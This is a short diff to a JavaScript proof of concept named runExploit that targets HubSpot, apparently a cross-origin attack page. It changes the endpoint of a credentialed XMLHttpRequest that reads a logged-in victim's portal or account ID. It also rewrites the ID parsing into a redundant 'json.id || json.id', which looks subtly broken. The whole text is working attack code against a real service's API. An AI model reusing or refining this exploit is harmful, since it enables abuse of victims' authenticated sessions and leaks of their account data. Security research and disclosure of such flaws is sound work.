@@ -33,7 +33,7 @@
       function runExploit() {
         // Step 1: GET portal info
         const xhr1 = new XMLHttpRequest();
-        xhr1.open("GET", "https://api-eu1.hubspot.com/home/v2/api/portal", true);
+        xhr1.open("GET", "https://app-eu1.hubspot.com/api/accounts/v1/basic-accounts/pinned", true);
         xhr1.withCredentials = true;
         xhr1.setRequestHeader("Content-Type", "application/json");
 
@@ -51,7 +51,7 @@
             let portalId = null;
             try {
               const json = JSON.parse(xhr1.responseText);
-              portalId = json.portalId || json.id;
+              portalId = json.id || json.id;
             } catch (e) {
               log("[-] Failed to parse portalId.");
               return;
